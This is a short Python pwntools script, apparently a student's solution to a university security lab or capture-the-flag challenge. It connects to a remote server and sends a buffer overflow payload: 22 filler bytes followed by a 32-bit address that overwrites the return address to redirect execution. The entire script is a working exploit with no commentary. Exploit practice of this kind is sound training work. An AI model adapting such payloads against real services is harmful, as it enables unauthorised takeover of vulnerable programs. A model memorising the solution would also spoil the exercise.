from pwn import *
import time

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 22154

s = remote(SERVER, PORT, timeout=9999)

time.sleep(1)
print(s.recv(512).decode())
s.sendline(b'x' * 22 + b'\xf1\x86\x04\x08')
time.sleep(1)
print(s.recv(512).decode())